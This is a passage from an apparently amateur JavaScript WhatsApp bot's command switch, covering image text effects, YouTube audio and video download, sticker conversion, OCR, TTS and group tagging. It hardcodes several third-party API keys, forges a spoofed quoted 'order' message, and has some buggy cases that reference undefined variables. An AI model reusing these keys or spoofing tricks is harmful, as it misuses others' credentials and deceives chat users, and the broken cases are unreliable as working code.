haha = await fetchJson(`https://api.zeks.xyz/api/lithgtext?text=${pc}&apikey=apivinz`)
hehe = await getBuffer(haha.result)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌an error has occurred❌')
}
break

case 'silktext':
try {  
if (args.length < 1) return reply(`Type correctly:\nCommand: ${prefix}silktext text`)
pc = body.slice(9)
reply(ptbr.waitimg())
haha = await fetchJson(`https://api.zeks.xyz/api/silktext?text=${pc}&apikey=apivinz`)
hehe = await getBuffer(haha.result)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌an error has occurred❌')
}
break

case 'flametext':
try {  
if (args.length < 1) return reply(`Type correctly:\nCommand: ${prefix}flametext text`)
pc = body.slice(10)
reply(ptbr.waitimg())
haha = await fetchJson(`https://api.zeks.xyz/api/flametext?text=${pc}&apikey=apivinz`)
hehe = await getBuffer(haha.result)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌an error has occurred❌')
}
break

case 'glowtext':
if (args.length < 1) return reply(`Type correctly:\nCommand: ${prefix}glowtext text`)
pc = body.slice(9)
reply(ptbr.waitimg())
haha = await fetchJson(`https://api.zeks.xyz/api/glowtext?text=${pc}&apikey=apivinz`)
hehe = await getBuffer(haha.result)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'crosslogo':
try {  
if (args.length < 1) return reply(`Type correctly:\nCommand: ${prefix}crosslogo text`)
pc = body.slice(10)
reply(ptbr.waitimg())
haha = await fetchJson(`https://api.zeks.xyz/api/crosslogo?text=${pc}&apikey=apivinz`)
hehe = await getBuffer(haha.result)
setTimeout( () => {
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
}, 10000)
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply('❌an error occurred❌\n\nPlease try again. ')
}
break

case 'gtav':
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
reply(ptbr.wait())
owgi = await tiringa.downloadAndSaveMediaMessage(ted)
tels = body.slice(7)
anu = await imgbb("0c419be2e8bfc27eff00147b0c763418", owgi)
hehe = await getBuffer(`https://videfikri.com/api/textmaker/gtavposter/?urlgbr=${anu.display_url}`)
tiringa.sendMessage(from, hehe, image, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
} else {
reply('You need to tag or send an image')
}
break

case 'wa.me':
case 'wame':
tiringa.updatePresence(from, Presence.composing)
options = {
text: `Your link wa.me: wa.me/${sender.split("@s.whatsapp.net")[0]}\nOu: \napi.whatsapp.com/send?phone=${sender.split("@")[0]}`,
contextInfo: {
mentionedJid: [sender]
}
}
tiringa.sendMessage(from, options, text, {
thumbnail: dnsnew, sendEphemeral: true,quoted: mek
})
break

case 'notif':
if (!isGroupAdmins) return reply(ptbr.admin())
tiringa.updatePresence(from, Presence.composing)
if (!isGroup) return reply(ptbr.group())
if(args.length < 1) return tiringa.reply('write something as a warning')
aviso  = `Warning of: @${sender.split("@")[0]}\n\nNotice: ${body.slice(7)}`
group = await tiringa.groupMetadata(from);
member = group['participants']
jids = [];
member.map(async adm => {
jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
})
options = {
text: aviso,
contextInfo: {
mentionedJid: jids
},
thumbnail: dnsnew, sendEphemeral: true,quoted: mek
}
await tiringa.sendMessage(from, options, text)
break

//_TE MENCIONA
case 'tag':
			if (args.length < 1) return reply(`Use ${prefix}tag 91xxx`)
            var nomqm = `${body.slice(5)}@s.whatsapp.net`
					tagq = `@${nomqm.split('@')[0]}` 
					tiringa.sendMessage(from, tagq, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: dnsnew, surface: 200, message: `White-Walker`, orderTitle: `White-Walker`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
			break
case 'tagme':
const tagme = {
text: `@${sender.split("@")[0]} 🧙‍♂️`,
contextInfo: {mentionedJid: [sender]
}
}
tiringa.sendMessage(from, tagme, text)
break
case 'tagme2':
const tagme2 = {
text: `${sender.split("@")[0]}🤩️`,
contextInfo: {mentionedJid: [sender]
}
}
tiringa.sendMessage(from, tagme2, text)
break
case 'play':
						if (args.length == 0) return reply(`Use ${prefix}play <audio name>`)
						reply(`*ᴡᴀɪᴛ ɪs ɪɴ ᴘʀᴏᴄᴇss*`)
						query = args.join(" ")		
						get_result = await fetchJson(`http://api.lolhuman.xyz/api/ytplay?apikey=e90e518bd1dc8f5959f0084c&query=${query}`)
						get_result = get_result.result
						get_info = get_result.info					
					reply('*Uplaoding your song pleas wait...*')
						get_audio = await getBuffer(get_result.audio[3].link)
						tiringa.sendMessage(from, get_audio, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true}) 	   					
						break
case 'play2':
msgFilter.isFiltered(from)
if (args.length < 1) return reply('Type Music Name!..')
play = body.slice(6)
reply('*🧭ᴡᴀɪᴛ ɪs ɪɴ ᴘʀᴏᴄᴇss...*')
anu = await fetchJson(`https://api-exteam.herokuapp.com/api/yt/playmp3?query=${play}&apikey=estreia`)
infomp3 = 
`   ᴍᴜzic ғᴏᴜnᴅᴇd
‣ ᴛɪᴛʟe: ${anu.result.title} `
buffer = await getBuffer(anu.result.thumbnail)
//lagu = await getBuffer(anu.result.url_audio)
lagu = await getBuffer(aanu.url)
setTimeout( () => {
tiringa.sendMessage(from, buffer, image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: infomp3})
}, 1500)
reply('Downloading and uploading your music....')
tiringa.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', ptt:true})
break

case 'ytsearch':
if (args.length < 1) return reply('Type what you want to search for')
reply('Searching...')
play = body.slice(9)
try {
anu = await fetchJson(`https://videfikri.com/api/ytplay/?query=${play}`)
if (anu.error) return reply(anu.error)
infomp3 = 
`    MUSIC FOUND
   ‣ Title: ${anu.result.title}
   ‣ Source: ${anu.result.source}
   ‣ Channel: ${anu.result.channel}
   ‣ link: ${anu.result.url} 
   ‣ Duration: ${anu.result.duration}
   ‣ Size: ${anu.result.size}
`
buffer = await getBuffer(anu.result.thumbnail)
lagu = await getBuffer(anu.result.url)
tiringa.sendMessage(from, buffer, image, {
thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: infomp3
})
} catch {
reply(ptbr.erro())
}
break

case 'dadosfake':
anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/fake_identity`)
dadosf = 
`    DATA GENERATED
   ‣ Name: ${anu.nome}
   ‣ Sex: ${anu.gender}
   ‣ Age: ${anu.age}
   ‣ Telephone: ${anu.phone}
   ‣ Blood type: ${anu.blood_type}
   ‣ E-mail: ${anu.email}
   ‣ Password: ${anu.password}
   ‣ CEP: ${anu.zip_code}`
tiringa.sendMessage(from, dadosf, text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
break
case 'ytmp3':
			
			if (args.length < 1) return reply('Where’s the url, sis?')
			const urlmsc = args[0];
		    try {
        	var aramam = await yts({videoId: ytdl.getURLVideoID(urlmsc)});
    		} catch {
        	return await tiringa.sendMessage(from, 'Error!', MessageType.text)
    		}
            reply(ptbr.wait())
    		let titles = 'do you love w?:)'
    		let streams = ytdl(aramam.videoId, {
        	quality: 'highestaudio',
   			});
    		var mbuff = await getBuffer(aramam.image)
    		got.stream(aramam.image).pipe(fs.createWriteStream(titles + '.jpg'));
    		ffmpeg(streams)
        	.audioBitrate(320)
        	.save('./' + titles + '.mp3')
        	.on('end', async () => {
            const writers = new ID3Writer(fs.readFileSync('./' + titles + '.mp3'));
            writers.setFrame('TIT2', aramam.title)
            .setFrame('TPE1', [aramam.author.name])
            .setFrame('APIC', {
            type: 3,
            data: fs.readFileSync(titles + '.jpg'),
            description: aramam.description
            });
            writers.addTag();
            playmsc = `「 *_YOUTUBE MP3_* 」\n\n❏ *Title* : ${aramam.title}\n❏ *By* : ${aramam.author.name}\n\nSoon the audio will be sent`
            await tiringa.sendMessage(from, mbuff, image, {quoted: mek, caption: playmsc})
            await tiringa.sendMessage(from, Buffer.from(writers.arrayBuffer), audio, {mimetype: Mimetype.mp4Audio, ptt: false, quoted: mek});
        	fs.unlinkSync(titles + '.jpg')
        	fs.unlinkSync('./' + titles + '.mp3')
        	});
			break
            case 'ytmp4':
	 		if (args.length < 1) return reply('Where’s the url, sis?')
			const urlvid = args[0]
		    try {
        	var aramav = await yts({videoId: ytdl.getURLVideoID(urlvtext)});
    		} catch {
        	return await tiringa.sendMessage(from, 'Error!', MessageType.text)
    		}
    		reply(ptbr.wait())
    		var yt = ytdl(aramav.videoId, {filter: format => format.container === 'mp4' && ['720p', '480p', '360p', '240p', '144p'].map(() => true)});
  			yt.pipe(fs.createWriteStream('./' + aramav.videoId + '.mp4'));
  			yt.on('end', async () => {
  			playvid = `「 *_YOUTUBE MP4_* 」\n\n❏ *Title* : ${aramav.title}\n❏ *By* : ${aramav.author.name}\n\nThe video will be sent in a moment`	
        	await tiringa.sendMessage(from, fs.readFileSync('./' + aramav.videoId + '.mp4'), video, {mimetype: Mimetype.mp4, quoted: mek, caption: playvid});
        	fs.unlinkSync('./' + aramav.videoId + '.mp4')
        	});
			break

case 'ytmp32':
msgFilter.isFiltered(from)
reply(ptbr.wait())
play = body.slice(8)
if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply('Esse link não é do YouTube')
try {
anu = await fetchJson(`https://api-tiringa.italuh.repl.co/api/yta?url=${play}`)
infomp3 = `INFORMATION AUDIO\n‣ Title: ${anu.result.title}\n‣ Source: ${anu.result.source}\n‣ Size for: ${anu.result.size}\nlink: ${anu.result.link}`
buffer = await getBuffer(anu.result.thumb)
lagu = await getBuffer(anu.result.link)
tiringa.sendMessage(from, buffer, image, {
thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: infomp3
})
tiringa.sendMessage(from, lagu, audio, {
mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, thumbnail: dnsnew, duration: 999999999,sendEphemeral: true,quoted: mek
})
} catch {
reply(ptbr.erro())
}
break

case 'ytmp42':
msgFilter.isFiltered(from)
reply(ptbr.wait())
play = body.slice(7)
try {
anu = await fetchJson(`https://api.zeks.xyz/api/ytmp4?url=${play}&apikey=apivinz`)
if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply('Esse link não é do YouTube')
if (anu.error) return reply(anu.error)
infomp3 = `INFORMAÇÕES DO VÍDEO\n‣ Título: ${anu.result.title}\n‣ Fonte: ${anu.result.source}\n‣ Tamanho: ${anu.result.size}\nlink: ${anu.result.url_video}`
buffer = await getBuffer(anu.result.thumbnail)
lagu = await getBuffer(anu.result.url_video)
tiringa.sendMessage(from, buffer, image, {
thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: infomp3
})
tiringa.sendMessage(from, lagu, video, {
mimetype: 'video/mp4', filename: `${anu.result.title}.mp4`, thumbnail: dnsnew, sendEphemeral: true,quoted: mek
}) 
} catch {
reply(ptbr.erro())
}
break

//_CAPTURA O text NA IMAGEM
case 'ocr':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const ocrt = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const com = await tiringa.downloadAndSaveMediaMessage(ocrt)
reply(ptbr.wait())
await recognize(com, {lang: 'eng+ind', oem: 1, psm: 3})
.then(oc => {
reply(oc.trim())
fs.unlinkSync(com)
})
.catch(err => {
reply(err.message)
fs.unlinkSync(com)
})
} else {
reply(`Tag or send an image with ${prefix}ocr to capture the image text`)
}
break

//_CRIAÇÃO DE STICKERS
case 's':
case 'stiker':
case 'sticker':
case 'stickergif':
case 'stikergif':
case 'fig':
case 'gif':
case 'figura':
case 'figu':
case 'figurinha':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await tiringa.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.webp')
await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply(ptbr.stick())
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ${addMetadata('white-walker', 'A.bin')} ${ran} -o ${ran}`, async (error) => {
if (error) return reply(ptbr.stick())
tiringa.sendMessage(from, fs.readFileSync(ran), sticker, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
fs.unlinkSync(media)	
fs.unlinkSync(ran)	
 })
 })
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`, `scale='min(180,iw)':min'(180,ih)':force_original_aspect_ratio=decrease,fps=20, pad=180:180:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await tiringa.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.webp')
reply(ptbr.wait())
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`The conversion of ${tipe} for sticker failed`)
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ${addMetadata('white-walker', 'A.bin')} ${ran} -o ${ran}`, async (error) => {
if (error) return reply(ptbr.stick())
tiringa.sendMessage(from, fs.readFileSync(ran), sticker, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
fs.unlinkSync(media)
fs.unlinkSync(ran)
})
})
//.addOutputOptions(["-y", "-vcodec libwebp", "-lossless 1", "-qscale 1", "-preset default", "-loop 0", "-an", "-vsync 0", "-s 512x512"])
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`, `scale='min(180,iw)':min'(180,ih)':force_original_aspect_ratio=decrease,fps=20, pad=180:180:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(ran)
} else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await tiringa.downloadAndSaveMediaMessage(encmedia)
ranw = getRandom('.webp')
ranp = getRandom('.png')
reply(ptbr.waitgif())
keyrmbg = 'sfFSzxRz7y6jYDwfxx47rCgz'
await removeBackgroundFromImageFile({path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp}).then(res => {
fs.unlinkSync(media)
let buffer = Buffer.from(res.base64img, 'base64')
fs.writeFileSync(ranp, buffer, (err) => {
if (err) return reply('an error has occurred')
})
exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {
fs.unlinkSync(ranp)
if (err) return reply(ptbr.stick())
exec(`webpmux -set exif ${addMetadata('white-walker', 'A.bin')} ${ranw} -o ${ranw}`, async (error) => {
if (error) return reply(ptbr.stick())
tiringa.sendMessage(from, fs.readFileSync(ranw), sticker, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
fs.unlinkSync(ranw)
})
})
})
} else {
reply(`You need to upload or tag an image or video within 10 seconds`)
}
break

case 'st':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await tiringa.downloadAndSaveMediaMessage(encmedia)                                     
rano = getRandom('.webp')
await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
exec(`webpmux -set exif ${addMetadata('Tiringa-BOT', 'Italu')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(media)
reply(ptbr.stick())
})
})
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
tiringa.sendMessage(from, buffer, sticker, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
fs.unlinkSync(rano)
})
} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
const media = await tiringa.downloadAndSaveMediaMessage(encmedia)
rano = getRandom('.webp')
reply(ptbr.waitgif())
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
exec(`webpmux -set exif ${addMetadata('Tiringa-BOT', 'Italu')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`Conversion from ${tipe} to sticker failed`)
})
})
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
tiringa.sendMessage(from, buffer, sticker, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
fs.unlinkSync(rano)
})
} else {
reply(`You need to upload or tag an image or video within 10 secondss`)
}
break

//_CONVERTE VÍDEO EM ÁUDIO
case 'tomp3':
tiringa.updatePresence(from,
Presence.composing)
if (!isQuotedVideo) return reply(`Tag a video com ${prefix}tomp3`)
reply(ptbr.wait())
mitri = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
duh = await tiringa.downloadAndSaveMediaMessage(mitri)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${duh} ${ran}`, (err) => {
fs.unlinkSync(duh)
if (err) return reply('❌failed to convert video to mp3❌')
buffer = fs.readFileSync(ran)
tiringa.sendMessage(from, buffer, audio, {
mimetype: 'audio/mp4', thumbnail: dnsnew, sendEphemeral: true,quoted: mek
})
fs.unlinkSync(ran)
})
break

//_VOZ DO GOOGLE
case 'tts':
if (args.length < 1) return tiringa.sendMessage(from, `You must use the command correctly:\n${prefix}tts (tongue) (text)\nExample: ${prefix}tts en Good Morning\n\nUse: ${prefix}ts to list all languages`, text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
const gtts = require('./lib/gtts')(args[0])
if (args.length < 2) return tiringa.sendMessage(from, 'Where’s the text?', text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
dtt = body.slice(8)
ranm = getRandom('.mp3')
dtt.length > 1200
? reply('Text too large')
: gtts.save(ranm, dtt, function() {
tiringa.sendMessage(from, fs.readFileSync(ranm), audio, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, mimetype: 'audio/mp4', ptt:true})
fs.unlinkSync(ranm)
})
break

//_ALTERA O PREFIX
case 'setprefix':
if (args.length < 1) return
if (!isOwner) return reply(ptbr.ownerB())
prefix = body.slice(10)
up.prefix = prefix
fs.writeFileSync('./data/settings.json', JSON.stringify(up, null, '\t'))
reply(`The prefix has been changed to: ${prefix}`)
break
case 'devil3':
if (!isOwner) return reply(ptbr.ownerB())
reply(`wait editing...`)
break
//_BLOQUEIA O USUÁRIO
case 'block':
tiringa.updatePresence(from, Presence.composing)
if (!isGroup) return reply(ptbr.group())
if (!isOwner) return reply(ptbr.ownerB())
tiringa.blockUser (`${body.slice(8)}@c.us`, "add")
tiringa.sendMessage(from, `Memblokir nomor, Perintah Diterima`, text, {
thumbnail: dnsnew, sendEphemeral: true,quoted: mek
})
break

//_DESBLOQUEIA USUÁRIO BLOQUEADO
case 'unblock':
if (!isGroup) return reply(ptbr.group())
if (!isOwner) return reply(ptbr.ownerB())
tiringa.blockUser (`${body.slice(9)}@c.us`, "remove")
tiringa.sendMessage(from, `Membuka blokir, Perintah diterima`, text)
break

//_MENCIONA TODOS OS MEMBROS DO GRUPO
case 'tagall':
msgFilter.isFiltered(from)
tiringa.updatePresence(from, Presence.composing)
//reply('comando desativado para evitar flood')
if (!isGroup) return reply(ptbr.group())
if (!isPremium) return reply('You are not a premium user...')
if (!isGroupAdmins) return reply(ptbr.admin())
members_id = []
todos = (args.length > 1) ? body.slice(8).trim(): ''
todos += `Total: ${groupMembers.length} membros\n`
for (let mem of groupMembers) {
todos += `║➸@${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions('╭╾╼◐⚋ ༒ᴍᴇɴᴄɪᴏɴᴀʀ ᴛᴏᴅᴏs ༒⚋◑╾╼╮\n║➸'+todos+'╰╾╼◐⚋⚋ ༒ ∴₰Ⱦꪋℓo፝֯֟ ߷ ༒ ⚋⚋◑╾╼╯', members_id, true)
break
case 'totag':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(ptbr.admin())
			if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await tiringa.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await tiringa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            tiringa.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmediau = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await tiringa.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await tiringa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            tiringa.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmediau = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await tiringa.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await tiringa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4', duration: 999999999,
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            tiringa.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
         } else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await tiringa.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await tiringa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/gif',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            tiringa.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedDocument) && args.length == 0) {
            encmediau = isQuotedDocument ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await tiringa.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await tiringa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'text/plain',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            tiringa.sendMessage(from, ini_buffer, document, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await tiringa.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await tiringa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4', duration: 999999999,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            tiringa.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/dokumen/gif/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
case 'stickerwm':
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							wmsti = body.slice(11)
							if (!wmsti.includes('|')) return reply(`Send a picture or reply to an image with a caption *${prefix}stickerwm name|author*`)
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await tiringa.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							const packname1 = wmsti.split('|')[0]
							const author1 = wmsti.split('|')[1]
							exifi.create(packname1, author1, `stickwm_${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exifi ./sticker/stickwm_${sender}.exifi ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											tiringa.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./sticker/${sender}.webp`)	
											fs.unlinkSync(`./sticker/stickwm_${sender}.exifi`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							wmsti = body.slice(11)
							if (!wmsti.includes('|')) return reply(`Kirim gambar atau reply gambar dengan caption *${prefix}stickerwm nama|author*`)
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await tiringa.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							const packname1 = wmsti.split('|')[0]
							const author1 = wmsti.split('|')[1]
							exifi.create(packname1, author1, `stickwm_${sender}`)
							reply(mess.wait)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exifi ./sticker/stickwm_${sender}.exifi ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											tiringa.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)
											fs.unlinkSync(`./sticker/${sender}.webp`)
											fs.unlinkSync(`./sticker/stickwm_${sender}.exifi`)
										})
									})
